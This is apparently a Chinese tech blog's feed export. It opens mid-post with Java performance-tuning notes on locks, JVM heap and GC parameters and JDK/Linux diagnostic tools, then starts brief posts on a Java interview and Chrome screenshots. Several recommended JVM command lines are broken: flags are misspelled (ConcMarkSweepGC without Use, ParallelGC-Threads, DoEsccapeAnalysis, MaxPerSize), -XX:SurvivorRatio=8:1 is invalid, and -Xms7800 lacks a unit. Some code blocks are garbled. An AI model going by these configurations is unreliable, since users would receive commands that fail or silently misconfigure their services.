设置资源计数器，当资源计数器为0时，队列开始移动，否则进行排队操作。</p><h4 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h4><p>死锁会造成线程挂起彼此等待，死锁可以 dump 出栈空间即可分析。</p><p>死锁产生的必要条件：</p><ol><li>互斥条件：一个资源每次只能被一个进程使用</li><li>请求与保持条件：一个进程因请求资源被阻塞，对已经获得的资源保持不放</li><li>不剥夺条件：进程获得的资源，在未使用完之前，不能强行剥夺</li><li>循环等待等待条件：若干进程之间形成了一个等待资源的循环</li></ol><p>常见的死锁就是分布式锁和数据库锁之间的的矛盾。</p><p>例如 数据库某行记录 A，某个变量 B，两个线程分别获得了锁，然后互相等待对方释放。</p><h4 id="减少锁持有时间和颗粒度"><a href="#减少锁持有时间和颗粒度" class="headerlink" title="减少锁持有时间和颗粒度"></a>减少锁持有时间和颗粒度</h4><p>当锁不可避免时，应该减少锁的持有时间和颗粒度。</p><ul><li>synchronized 只锁变量不要锁类，注意 self  和 this的区别</li><li>数据库锁行，而不要锁表</li><li>使用分段锁减少锁的颗粒度</li></ul><h4 id="使用读写分离锁来替换独占锁"><a href="#使用读写分离锁来替换独占锁" class="headerlink" title="使用读写分离锁来替换独占锁"></a>使用读写分离锁来替换独占锁</h4><p>读一般无需上锁，因此不应该将所有的请求都上锁，只对写上锁即可。</p><h4 id="锁分离思想"><a href="#锁分离思想" class="headerlink" title="锁分离思想"></a>锁分离思想</h4><p>根据读写分离锁的思想，更新、删除或其他操作都可以分别上锁，而不是一个大锁。</p><p>例如 LinkedblockingQueue 基于链表，那么 take 和 put 操作可以分开上锁，减少锁竞争。</p><h4 id="合理使用重入锁和内部锁-（synchronized）"><a href="#合理使用重入锁和内部锁-（synchronized）" class="headerlink" title="合理使用重入锁和内部锁 （synchronized）"></a>合理使用重入锁和内部锁 （synchronized）</h4><p>优先使用内部锁，减少编程复杂度，需要时再使用 ReentrantLock</p><h4 id="锁粗化-（Lock-Coarsening）"><a href="#锁粗化-（Lock-Coarsening）" class="headerlink" title="锁粗化 （Lock Coarsening）"></a>锁粗化 （Lock Coarsening）</h4><p>锁粗化是相对于锁细粒度的另外一个极端情况的，当锁粒度过于细，反复获取锁也是不对的，应该保持适度。</p><p>在循环体中不应该使用锁，而是应该在循环体外使用锁，否则锁会反复被获取和释放。</p><h4 id="开启-JVM-锁自璇"><a href="#开启-JVM-锁自璇" class="headerlink" title="开启 JVM 锁自璇"></a>开启 JVM 锁自璇</h4><p>如果一个锁反复没有获取，线程切换的成本很高，还不如让它执行空循环（自旋）。</p><blockquote><p>=XX:+UseSpinning </p></blockquote><p>开启自旋</p><h4 id="开启-JVM-自动锁消除"><a href="#开启-JVM-自动锁消除" class="headerlink" title="开启 JVM 自动锁消除"></a>开启 JVM 自动锁消除</h4><p>有一些程序不必要使用锁，例如局部变量，JVM 可以优化为开启自旋锁。</p><blockquote><p>-server -XX:+DoEsccapeAnalysis -XX:+EliminateLocks </p></blockquote><p>开启逃逸分析和锁消除。</p><h4 id="开启锁偏向"><a href="#开启锁偏向" class="headerlink" title="开启锁偏向"></a>开启锁偏向</h4><p>如果没有发生竞争就进入锁偏向模式，关闭同步操作，用于优化不激烈的锁场景，这个优化场景意义不大。</p><blockquote><p>-XX:+UseBiasedLocking </p></blockquote><h3 id="无锁并行计算设计"><a href="#无锁并行计算设计" class="headerlink" title="无锁并行计算设计"></a>无锁并行计算设计</h3><p>无锁的算法实际上就是一些乐观锁 CAS、COW等。</p><h4 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h4><p>在 atomic 包下有一些原子操作类，大量使用 CAS 技术，非常有用。</p><p>例如 AtomicInteger.addAndGet() 通过一个无穷循环 CAS 直到成功。</p><h4 id="Amino-框架"><a href="#Amino-框架" class="headerlink" title="Amino 框架"></a>Amino 框架</h4><p>提供了一些成熟的无锁数据结构。</p><h2 id="JVM-调优"><a href="#JVM-调优" class="headerlink" title="JVM 调优"></a>JVM 调优</h2><p>JVM 输出调试信息</p><blockquote><p>-XX:+PrintGCDetails</p></blockquote><h3 id="虚拟机内存模型"><a href="#虚拟机内存模型" class="headerlink" title="虚拟机内存模型"></a>虚拟机内存模型</h3><p>JVM 虚拟机模型</p><p><img src="/性能优化/performance/performance-overview/format,png.png" alt="img"></p><p>堆内存模型</p><p><img src="/性能优化/performance/performance-overview/70.png" alt="img"></p><h4 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h4><h4 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h4><p>栈的大小决定了函数调用可达的深度，-Xss 设置栈的大小，一般无需设置此参数，应该消除递归代码</p><p>一般设置为 -Xss1M</p><p>另外，函数嵌套调用次数由栈的大小决定。栈越大，函数的嵌套调用次数越多。对一个函数而言，它的参数越多，内部局部变量越多，栈帧就越大，嵌套调用次数就会减少。</p><h4 id="本地方栈"><a href="#本地方栈" class="headerlink" title="本地方栈"></a>本地方栈</h4><p>本地方法栈为 java 原生函数调用使用的空间。</p><h4 id="Java-堆"><a href="#Java-堆" class="headerlink" title="Java 堆"></a>Java 堆</h4><p>Java 堆为Java对象存储位置。采用分代内存回收策略：</p><ul><li>新生代<ul><li>eden 伊利园</li><li>s0 survior</li><li>s1 survior</li></ul></li><li>老年代</li></ul><p>使用 -XX 参数设置</p><h4 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h4><p>方法去也可称为永久区，主要存放常量和类的定义信息。</p><h3 id="JVM-内存分配参数"><a href="#JVM-内存分配参数" class="headerlink" title="JVM 内存分配参数"></a>JVM 内存分配参数</h3><h4 id="设置最大堆内存"><a href="#设置最大堆内存" class="headerlink" title="设置最大堆内存"></a>设置最大堆内存</h4><blockquote><p>-Xmx </p></blockquote><p>默认为物理内存的四分之一，一般可以开启到物理内存一致。</p><h4 id="设置最小堆内存"><a href="#设置最小堆内存" class="headerlink" title="设置最小堆内存"></a>设置最小堆内存</h4><blockquote><p>-Xms</p></blockquote><p>JVM启动会先按照最小堆内存运行，然后尝试运行时申请更多内存。如果最小堆内存过小，就会频繁触发 GC。</p><p>包括 Minor GC和Full GC。</p><p>JVM 会试图将内存尽可能限制在 -Xms 中。因此，当内存实际使用量初级 -Xms 指定的大小时，会触发 Full GC。因此 -Xms 值设置为 -Xmx 可以减少GC的次数和耗时。</p><p>这个操作的前提是，需要预知系统内存使用量。</p><h4 id="设置新生代"><a href="#设置新生代" class="headerlink" title="设置新生代"></a>设置新生代</h4><blockquote><p>-Xmn</p></blockquote><p>设置一个较大的新生代会减少老年代的大小，这个参数对系统性能以及 GC 行为有很大的影响。新生代的大小一般设置为整个堆空间的 1/4 左右。</p><h4 id="设置持久代"><a href="#设置持久代" class="headerlink" title="设置持久代"></a>设置持久代</h4><blockquote><p>-XX:MaxPerSize</p></blockquote><p>持久代（方法区）不属于堆的一部分，持久代决定了系统可以支持多少个类定义和多少常量。如果使用了 CGlib 或者 Javassist 等动态字节码技术的程序，需要合理设置。</p><p>一般来说，设置为 64M 已经够用，如果出现溢出，可以设置为  128M。</p><p>如果 128M依然不能满足，不应该继续增加参数值。而是优化程序设计。</p><h4 id="设置线程栈"><a href="#设置线程栈" class="headerlink" title="设置线程栈"></a>设置线程栈</h4><blockquote><p>-Xss </p></blockquote><p>线程栈是线程的一块私有空间，决定了支持线程的数量。</p><p>如果线程栈的空间很大，则允许支持的线程数量就会减少，因此这个值需要合理设置。</p><p>由于堆的增加会挤占栈空间的大小，因此设置这个参数需要和堆大小合理取舍。</p><h4 id="堆的比例分配"><a href="#堆的比例分配" class="headerlink" title="堆的比例分配"></a>堆的比例分配</h4><p>新生代和S区域的比例</p><blockquote><p>-XX:SurviorRation=eden/s0=eden/s1</p></blockquote><h4 id="堆参数设置总结"><a href="#堆参数设置总结" class="headerlink" title="堆参数设置总结"></a>堆参数设置总结</h4><p><img src="/性能优化/performance/performance-overview/image-20200319125358200.png" alt="image-20200319125358200"></p><ul><li>-Xms：初始堆大小</li><li>-Xmx：最大堆大小</li><li>-Xss：线程栈的大小</li><li>-XX：NewSize：设置新生代大小</li><li>-XX：PermSize：永久区的初始值</li><li>-XX：MaxPermSize：永久区的最大值</li><li>-XX：MinHeapFreeRatio：设置堆空间最小空闲比例</li><li>-XX：MaxHeapFreeRatio：设置堆空间最大空闲比例</li><li>-XX：NewRatio：设置老年代与新生代的比例</li><li>-XX：SurviorRatio：新生代中eden区域survivior区的比例</li></ul><h3 id="垃圾收集基础"><a href="#垃圾收集基础" class="headerlink" title="垃圾收集基础"></a>垃圾收集基础</h3><h4 id="jdk-垃圾回收器设置策略"><a href="#jdk-垃圾回收器设置策略" class="headerlink" title="jdk 垃圾回收器设置策略"></a>jdk 垃圾回收器设置策略</h4><ul><li>OpenJDK  8 使用 Parallel GC </li><li>OpenJDK 8 提供了Parallel GC、CMS 和 G1 三种收集算法</li></ul><p>比较</p><ul><li>Parallel GC  JDK 默认设置，关注吞吐量，服务器调优优先推荐使用这个值</li><li>G1 关注暂停</li><li>CMS 关注 gc 时间</li></ul><h3 id="调优方法"><a href="#调优方法" class="headerlink" title="调优方法"></a>调优方法</h3><p>调优需要搞清楚自己想要什么，这是最重要的，通过基准测试，明白现状，结合硬件平台和业务类型调优。</p><p>调优往往有几个目的：</p><ul><li>提高吞吐量</li><li>减少停顿</li><li>出现内存泄漏、死锁等问题需要查找</li></ul><p>调优建立在一个合理的背景下，JDK 默认的设置能满足大部分场景需要，是比较均衡的，一般来说无需调优。兼顾内存分配的灵活性（多个java应用同时存在）、吞吐量、停顿时间。只有需要侧重调整的时候才需要调优。例如为了高吞吐量，内存分配灵活性就没意义了，让单个java应用初始堆大小直接设置为预期值，可以减少 gc 次数。另外为了高吞吐量，在服务器开发中停顿可以在一定程度上容忍，可以选择对提高吞吐量友好的 gc 回收器。</p><p>一般来说，提高吞吐量、减少停顿是比较矛盾的两个指标。</p><p>另外，应用性能下降和内存泄漏、死锁等问题有关，解决问题后，性能就会极大的提升。</p><h4 id="提高吞吐量配置方案"><a href="#提高吞吐量配置方案" class="headerlink" title="提高吞吐量配置方案"></a>提高吞吐量配置方案</h4><p>在服务器开发中，吞吐量比系统短时间停顿更重要，优先选用 Parallel GC ，合理设置堆大小。以 8G4U 的服务器来说，如果只部署单应用，可以参考以下参数：</p><pre><code class="shell">java -Xmx7800m -Xms7800 -Xmn4g -Xss128k -XX:+UseParallelGC -XX:ParallelGC-Threads=4 -XX:+UseParallelOldGC</code></pre><ul><li>-Xmx7800m -Xms7800 设置最大堆等于初始值，让内存全部给 java 应用使用，让最大堆等于初始值可以避免 运行初期堆内存不足造成的频繁GC。</li><li>-Xmn4g 这是新生代大小，这个需要结合程序设计，以及内存分析结果设置</li><li>-Xss128k 尽量减小线程栈，可以支持更多的线程</li><li>-XX:+UserParallelGC 新生代使用 UserParallelGC </li><li>-XX:+UserParallelOldGC 老年代使用 UserParallelGC </li></ul><h4 id="减低停顿时间的案例"><a href="#减低停顿时间的案例" class="headerlink" title="减低停顿时间的案例"></a>减低停顿时间的案例</h4><p>对于老年代使用 CMS G减低停顿。尽可能让对象留在新生代，然后被 Minor GC回收，因此设置 eden 和 survivor 区的比例为 8:1，让对象尽可能留在新生代，如果 survivor 不够用，会直接进入老年代。</p><pre><code class="shell">java -Xmx7800m -Xms7800 -Xmn4g -Xss128k  -XX:ParallelGC-Threads=4 -XX:+ConcMarkSweepGC -XX:+UseParNewGC -XX:SurvivorRatio=8:1 -XX:TargetSurvivor-Ratio=90 -XX:MaxTenuringThreshold=30</code></pre><ul><li>-Xmx7800m -Xms7800 -Xmn4g -Xss128k 设置堆和线程栈</li><li>-XX:+UseParNewGC 为新生代使用 ParallelGC</li><li>-XX:+ConcMarkSweepGC  整体使用 CMS</li><li>-XX:SurvivorRatio=8:1 Survivor 比例为 80%</li><li>-XX:TargetSurvivor-Ratio=90 Survivor可用比例，默认是 50%，如果超过这个值就会向老年代压缩。</li><li>-XX:ParallelGC-Threads=4 GC 回收线程</li><li>-XX:MaxTenuringThreshold=30 设置年轻对象进入老年代的阈值，默认是 15，就是15次 Minor GC依然存活就会进入老年代，这里设置为30，降低进入老年代的概率。</li></ul><h3 id="实用的-JVM-参数"><a href="#实用的-JVM-参数" class="headerlink" title="实用的 JVM 参数"></a>实用的 JVM 参数</h3><p>查看  GC 分配情况</p><blockquote><p>java -XX:+PrintGCDetails -version</p></blockquote><pre><code class="shell">[root@localhost ~]# java -XX:+PrintGCDetails -versionopenjdk version &quot;1.8.0_131&quot;OpenJDK Runtime Environment (build 1.8.0_131-b12)OpenJDK 64-Bit Server VM (build 25.131-b12, mixed mode)Heap PSYoungGen      total 17408K, used 922K [0x00000000ece00000, 0x00000000ee100000, 0x0000000100000000)  eden space 15360K, 6% used [0x00000000ece00000,0x00000000ecee6810,0x00000000edd00000)  from space 2048K, 0% used [0x00000000edf00000,0x00000000edf00000,0x00000000ee100000)  to   space 2048K, 0% used [0x00000000edd00000,0x00000000edd00000,0x00000000edf00000) ParOldGen       total 39936K, used 0K [0x00000000c6a00000, 0x00000000c9100000, 0x00000000ece00000)  object space 39936K, 0% used [0x00000000c6a00000,0x00000000c6a00000,0x00000000c9100000) Metaspace       used 2418K, capacity 4480K, committed 4480K, reserved 1056768K  class space    used 233K, capacity 384K, committed 384K, reserved 1048576K</code></pre><p>查看 GC 参数</p><pre><code class="shell">[root@localhost ~]# java -XX:+PrintCommandLineFlags -version-XX:InitialHeapSize=60045120 -XX:MaxHeapSize=960721920 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC openjdk version &quot;1.8.0_131&quot;OpenJDK Runtime Environment (build 1.8.0_131-b12)OpenJDK 64-Bit Server VM (build 25.131-b12, mixed mode)</code></pre><h4 id="开启-JIT-编译参数"><a href="#开启-JIT-编译参数" class="headerlink" title="开启 JIT 编译参数"></a>开启 JIT 编译参数</h4><blockquote><p>-XX:CompileThreadhold</p></blockquote><p>设置阈值，Java 代码进入 JIT 编译模型。</p><h4 id="堆-dump"><a href="#堆-dump" class="headerlink" title="堆 dump"></a>堆 dump</h4><blockquote><p>-XX: + HeapDumpOnOutOfMemoryError </p></blockquote><p>内存溢出时，dump 堆内存信息，还可以设置导出的位置</p><blockquote><p>-XX: HeapDumpPath </p></blockquote><h4 id="发生-OOM-时候执行一段脚本"><a href="#发生-OOM-时候执行一段脚本" class="headerlink" title="发生 OOM 时候执行一段脚本"></a>发生 OOM 时候执行一段脚本</h4><blockquote><p>-XX: OnOutOfMemoryError=./restart.sh</p></blockquote><p>可以在发生内存溢出时候重启服务, 或者通知</p><h3 id="常用的-JVM-工具"><a href="#常用的-JVM-工具" class="headerlink" title="常用的 JVM 工具"></a>常用的 JVM 工具</h3><h4 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h4><p>列出 java 的进程，类似于 ps 命令，不过只对 java 进程起作用，通过 jps 命令可以方便的查看 java 的进程启动类、传入参数和 JVM 参数等信息。</p><pre><code class="shell">[root@localhost software]# jps 29328 Jps1734 jenkins.war711 spring-boot-boilerplate.jar1502 UnixLauncher    </code></pre><p>参数 -m 可以输出传递给 Main 函数的参数:</p><p><code>`</code>shell g<br>1734 jenkins.war –logfile=/var/log/jenkins/jenkins.log –webroot=/var/cache/jenkins/war –daemon –httpPort=8000 –debug=5 –handlerCountMax=100 –handlerCountMaxIdle=20 –prefix=<br>711 spring-boot-boilerplate.jar –spring.profiles.active=dev<br>29369 Jps -m<br>1502 UnixLauncher start 9d17dc87   org.sonatype.nexus.karaf.NexusMain</p><pre><code>参数 -l 可以输出主函数的完整路径: ```    shell[root@localhost software]# jps -v 1734 jenkins.war -Dcom.sun.akuma.Daemon=daemonized -Djava.awt.headless=true -Djenkins.install.runSetupWizard=false -DJENKINS_HOME=/var/lib/jenkins711 spring-boot-boilerplate.jar29389 Jps -Dapplication.home=/opt/oracle/jdk1.8.0_131 -Xms8m1502 UnixLauncher -Dinstall4j.jvmDir=/opt/oracle/jdk1.8.0_131 -Dexe4j.moduleName=/usr/local/nexus/bin/nexus -XX:+UnlockDiagnosticVMOptions -Dinstall4j.launcherId=245 -Dinstall4j.swt=false -Di4jv=0 -Di4jv=0 -Di4jv=0 -Di4jv=0 -Di4jv=0 -Xms1200M -Xmx1200M -XX:MaxDirectMemorySize=2G -XX:+UnlockDiagnosticVMOptions -XX:+UnsyncloadClass -XX:+LogVMOutput -XX:LogFile=/usr/local/nexus/sonatype-work/nexus3/log/jvm.log -XX:-OmitStackTraceInFastThrow -Djava.net.preferIPv4Stack=true -Dkaraf.home=. -Dkaraf.base=. -Dkaraf.etc=etc/karaf -Djava.util.logging.config.file=etc/karaf/java.util.logging.properties -Dkaraf.data=/usr/local/nexus/sonatype-work/nexus3 -Djava.io.tmpdir=/usr/local/nexus/sonatype-work/nexus3/tmp -Dkaraf.startLocalConsole=false -Di4j.vpt=true</code></pre><p>参数  -v 可以显示传递给 JVM 的参数:</p><pre><code class="shell">[root@localhost software]# jps -v 29411 Jps -Dapplication.home=/opt/oracle/jdk1.8.0_131 -Xms8m1734 jenkins.war -Dcom.sun.akuma.Daemon=daemonized -Djava.awt.headless=true -Djenkins.install.runSetupWizard=false -DJENKINS_HOME=/var/lib/jenkins711 spring-boot-boilerplate.jar                  </code></pre><h4 id="jstat-命令"><a href="#jstat-命令" class="headerlink" title="jstat 命令"></a>jstat 命令</h4><p>jstat 可以查看某个 java 进程运行时的工具，非常强大，可以非常详细的查看 Java 应用程序的堆使用情况，以及 GC 情况。</p><p>例如，每秒钟统计一次类装载信息，共统计两次：</p><pre><code class="shell">[root@localhost software]# jstat -class -t 711 1000 2Timestamp       Loaded  Bytes  Unloaded  Bytes     Time          998981.4  14249 25586.8        0     0.0     127.05       998982.5  14249 25586.8        0     0.0     127.05</code></pre><p>查看 JIT 编译信息:</p><pre><code class="shell">[root@localhost software]# jstat -compiler -t 711Timestamp       Compiled Failed Invalid   Time   FailedType FailedMethod       999312.5     8453      2       0   115.88          1 org/springframework/core/annotation/AnnotatedElementUtils searchWithGetSemanticsInAnnotations    </code></pre><p>查看 GC 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gc 711 S0C    S1C    S0U    S1U      EC       EU        OC         OU       MC     MU    CCSC   CCSU   YGC     YGCT    FGC    FGCT     GCT   14848.0 9728.0  0.0   9427.4 99840.0  26216.5   73728.0    54161.6   76544.0 72788.4 10240.0 9518.9     49    2.662   3      2.449    5.111</code></pre><p>查看 GC 和各个代的当前大小：</p><pre><code class="shell">[root@localhost software]# jstat -gccapacity 711 NGCMN    NGCMX     NGC     S0C   S1C       EC      OGCMN      OGCMX       OGC         OC       MCMN     MCMX      MC     CCSMN    CCSMX     CCSC    YGC    FGC  19456.0 313344.0 129536.0 14848.0 9728.0  99840.0    39936.0   626688.0    73728.0    73728.0      0.0 1116160.0  76544.0      0.0 1048576.0  10240.0     49     3</code></pre><p>查看新生代 gc 信息：</p><pre><code class="shell">[root@localhost software]# jstat -gcnew 711 S0C    S1C    S0U    S1U   TT MTT  DSS      EC       EU     YGC     YGCT  14848.0 9728.0    0.0 9427.4 15  15 14848.0  99840.0  26466.1     49    2.662</code></pre><p>查看老年代 gc 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcold 711   MC       MU      CCSC     CCSU       OC          OU       YGC    FGC    FGCT     GCT    76544.0  72788.4  10240.0   9518.9     73728.0     54161.6     49     3    2.449    5.111</code></pre><p>查看老年代容量信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcoldcapacity 711   OGCMN       OGCMX        OGC         OC       YGC   FGC    FGCT     GCT       39936.0    626688.0     73728.0     73728.0    49     3    2.449    5.111</code></pre><p>查看 gc 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcutil 711  S0     S1     E      O      M     CCS    YGC     YGCT    FGC    FGCT     GCT     0.00  96.91  27.43  73.46  95.09  92.96     49    2.662     3    2.449    5.111</code></pre><h4 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h4><p>jinfo 可以查看应用的拓展参数，甚至修改。</p><p>查看是否开启 GC 信息打印:</p><pre><code class="shell">[root@localhost software]# jinfo -flag PrintGCDetails 711-XX:-PrintGCDetails</code></pre><p>说明没有开启 GC 信息的打印，通过 jinfo 临时开启:</p><pre><code class="shell">[root@localhost software]# jinfo -flag +PrintGCDetails 711[root@localhost software]# jinfo -flag PrintGCDetails 711-XX:+PrintGCDetails</code></pre><h4 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h4><p>用于 dump 出堆的快照和统计信息</p><pre><code class="shell">[root@localhost software]# jmap -histo 711 &gt; /tmp/711.txt[root@localhost software]# cat /tmp/711.txt  num     #instances         #bytes  class name----------------------------------------------   1:        139944       15081784  [C   2:         21776       14906296  [B   3:         10836       11056152  [I   4:           722       11023664  [J   5:        172795        5529440  java.util.HashMap$Node   6:        128993        3095832  java.lang.String   7:         33636        2959968  java.lang.reflect.Method   8:         70700        2262400  com.mysql.cj.conf.BooleanProperty   9:         15974        1987576  [Ljava.util.HashMap$Node;  10:         56835        1818720  java.util.concurrent.ConcurrentHashMap$Node  11:         15264        1685896  java.lang.Class</code></pre><p>更有用的是导出堆信息:</p><pre><code class="shell">[root@localhost software]# jmap -dump:format=b,file=./711.hprof 711Dumping heap to /opt/software/711.hprof ...Heap dump file created[root@localhost software]# ls711.hprof</code></pre><p>快照信息可以通过 Visual VM 和 jhat 命令分析。</p><h4 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h4><p>jhat 可以分析 jmap 导出的文件,然后启动一个 HTTP 服务器展示分析结果。</p><pre><code class="shell">[root@localhost software]# jhat 711.hprof Reading from 711.hprof...Dump file created Fri Mar 20 22:17:18 CST 2020Snapshot read, resolving...Resolving 1337950 objects...Chasing references, expect 267 dots...........................................................................................................................................................................................................................................................................Eliminating duplicate references...........................................................................................................................................................................................................................................................................Snapshot resolved.Started HTTP server on port 7000Server is ready.</code></pre><h4 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h4><p>可以打印出栈信息，包括线程、锁的信息，如果发现死锁信息，可以自动识别：</p><pre><code>[root@localhost software]# jstack -l 7112020-03-20 22:21:40Full thread dump OpenJDK 64-Bit Server VM (25.131-b12 mixed mode):&quot;Attach Listener&quot; #10160 daemon prio=9 os_prio=0 tid=0x00007f65840a8800 nid=0x74dc waiting on condition [0x0000000000000000]   java.lang.Thread.State: RUNNABLE   Locked ownable synchronizers:    - None&quot;lettuce-eventExecutorLoop-1-3&quot; #49 daemon prio=5 os_prio=0 tid=0x00007f65b92e7800 nid=0x934 waiting on condition [0x00007f65607e8000]   java.lang.Thread.State: WAITING (parking)    at sun.misc.Unsafe.park(Native Method)    - parking to wait for  &lt;0x00000000c7b3d718&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)    at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)    at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)    at io.netty.util.concurrent.SingleThreadEventExecutor.takeTask(SingleThreadEventExecutor.java:238)    at io.netty.util.concurrent.DefaultEventExecutor.run(DefaultEventExecutor.java:64)    at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:905)    at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)    at java.lang.Thread.run(Thread.java:748)   Locked ownable synchronizers:    - None</code></pre><h4 id="jstatd"><a href="#jstatd" class="headerlink" title="jstatd"></a>jstatd</h4><p>jstatd 可以启动一个远程调试端口，允许 jps、jstat 等工具远程访问，因为权限的原因，直接使用 jstatd 会报错。需要配置 policy 文件。</p><p>使用 vim 创建一个文件如下：</p><blockquote><p>vim jstatd.all.policy </p></blockquote><pre><code class="shell">grant codebase &quot;file:/opt/oracle/jdk1.8.0_131/lib/tools.jar&quot;{ permission java.security.AllPermission;};</code></pre><pre><code class="shell">[root@localhost ~]# jstatd -J-Djava.security.policy=./jstatd.all.policy</code></pre><p>默认开启端口 1099 </p><pre><code class="shell">[root@localhost ~]# jps localhost:109931136 Jps1734 jenkins.war711 spring-boot-boilerplate.jar1502 UnixLauncher</code></pre><p>这样可以让调试非常方便，同时可视化的分析工具也可以通过个 jstatd 提供的服务连接到需要分析的服务器。</p><h4 id="hprof-工具"><a href="#hprof-工具" class="headerlink" title="hprof 工具"></a>hprof 工具</h4><p>除了使用 jstatd  让目标服务器提供一个远程服务用于调试之外，还可以让 java 应用通过 agent 的方式启动，得到该应用的调试信息。</p><blockquote><p> Java -agentlib:hprof=heap=dump,format=b,file=/tmp/app.hprof -jar  xxx.jar</p></blockquote><p>除了 hprof 之外，市面上还有一些远程监控 java 应用的 apm 工具和平台，例如听云 apm。</p><h4 id="spring-actuator"><a href="#spring-actuator" class="headerlink" title="spring actuator"></a>spring actuator</h4><p>spring boot 的项目可以引入 spring-actuator，监控应用。actuator 功能之一就是导出堆信息 。</p><p>如果使用 maven 作为构建工具，引入包：</p><pre><code class="xml">    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;    &lt;/dependency&gt;</code></pre><p>spring-actuator 会提供很多用于度量项目的接口，其中可使用 heapdump 端口导出堆信息</p><blockquote><p>wget <a href="http://localhost:1001/monitor/actuator/heapdump" target="_blank" rel="noopener">http://localhost:1001/monitor/actuator/heapdump</a></p></blockquote><p>然后通过 VisualVM 或者 MAT 分析</p><h4 id="MAT-内存分析工具"><a href="#MAT-内存分析工具" class="headerlink" title="MAT  内存分析工具"></a>MAT  内存分析工具</h4><p>TODO</p><h4 id="VisualVM-分析工具"><a href="#VisualVM-分析工具" class="headerlink" title="VisualVM 分析工具"></a>VisualVM 分析工具</h4><p>TODO</p><h2 id="操作系统调优"><a href="#操作系统调优" class="headerlink" title="操作系统调优"></a>操作系统调优</h2><h3 id="linux-常用调优命令"><a href="#linux-常用调优命令" class="headerlink" title="linux 常用调优命令"></a>linux 常用调优命令</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h4><blockquote><p>top -hv | -bcHiOSs -d secs -n max -u|U user -p pid(s) -o field -w [cols</p></blockquote><p>使用 top 可以观察各个进程对 CPU 的占用和内存使用情况。</p><h4 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h4><p>sar 可以对内存和 CPU 的使用情况进行采样</p><p>统计 CPU 情况，每秒钟采样一次，共计采样 3 次</p><blockquote><p>Sar -u 1 3</p></blockquote><p>获取内存使用情况</p><blockquote><p>sar -r 1 3</p></blockquote><p>获取 I/O 信息</p><blockquote><p>L sar -b 1 3 </p></blockquote><h4 id="vmstart"><a href="#vmstart" class="headerlink" title="vmstart"></a>vmstart</h4><p>vm start 是一个功能更为齐全的工具，需要单独安装，也可以安装 busybox </p><blockquote><p>vmstat 1 3</p></blockquote><h4 id="Iostat"><a href="#Iostat" class="headerlink" title="Iostat"></a>Iostat</h4><blockquote><p>iostat 1 2</p></blockquote><p>可以查看CPU和磁盘IO信息</p><h4 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h4><p>可以查询某个线程的状态，找出那个线程造成了大量的IO、CPU使用率，然后通过 jps、jstack 分析该线程的 IO情况。</p><p>对线程 1520 cpu 使用率 每秒钟采样 1 次，总计采样 3次。</p><blockquote><p>pidstat -p 1520 -u 1 3</p></blockquote><p>对线程 1520 io 使用率 每秒钟采样 1 次，总计采样 3次。</p><blockquote><p>pidstat -p 1520 -d -t 1 3</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 面试</title>
      <link href="/%E9%9D%A2%E8%AF%95/interview/java-2020-3-18/"/>
      <url>/%E9%9D%A2%E8%AF%95/interview/java-2020-3-18/</url>
      
        <content type="html"><![CDATA[<h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li>Java</li><li>MySQL</li><li>Sprint boot</li><li>redis</li><li>Auth2.0</li><li>Open ID</li><li>鉴权到 API 粒度</li></ul><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>一级缓存，大容量，高并发，高性能，VM到容器化改造，微服务，自动化测试，工程能力需要加强。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chrome 自带截图</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/chrome-screenshot/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/chrome-screenshot/</url>
      
        <content type="html"><![CDATA[<p>有时候网页截图比较麻烦，实际上 Chrome 有一个自带截图工具非常好用。</p><p>打开控制台后输入：<code>Control + Shift + P</code> 调出控制台命令，Mac 下使用 Command 代替 Control键。</p><p>输入 <code>Screen</code> Chrome 会出现截图相关的命令：</p><p><img src="/开发工具/tool/chrome-screenshot/image-20200315160324484.png" alt="image-20200315160324484"></p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>服务器推送方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/websocket/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/websocket/</url>
      
